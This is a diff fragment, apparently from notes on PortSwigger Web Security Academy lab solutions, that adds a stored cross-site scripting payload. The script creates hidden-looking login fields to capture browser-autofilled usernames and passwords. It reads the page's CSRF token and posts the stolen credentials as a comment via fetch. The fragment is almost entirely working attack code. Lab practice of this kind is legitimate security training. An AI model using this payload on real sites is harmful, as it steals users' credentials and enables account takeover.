@@ -31,3 +31,22 @@ x.onreadystatechange = function() {
 x.send(null);
 </script>
 ```
+
+```
+<form><input type="text" id="username" name="username"></form>
+<form><input type="password" id="password" name="password"></form>
+<script>
+window.onload = function(e) {
+    setTimeout(function() {
+        var csrf = document.getElementsByName("csrf")[0].value;
+        var username = document.getElementById("username").value;
+        var passw = document.getElementById("password").value;
+        console.log(csrf);
+        fetch('https://ac741f481eba7f5d80a83ee7003a00d0.web-security-academy.net/post/comment', {
+            method: 'POST',
+            body: 'csrf=' + csrf + '&postId=3&comment=Username: ' + username + ', Password: ' + passw + '&name=Jan&email=admin%40cmdnctrl.net&website='
+        });
+    }, 2500);
+};
+</script>
+```
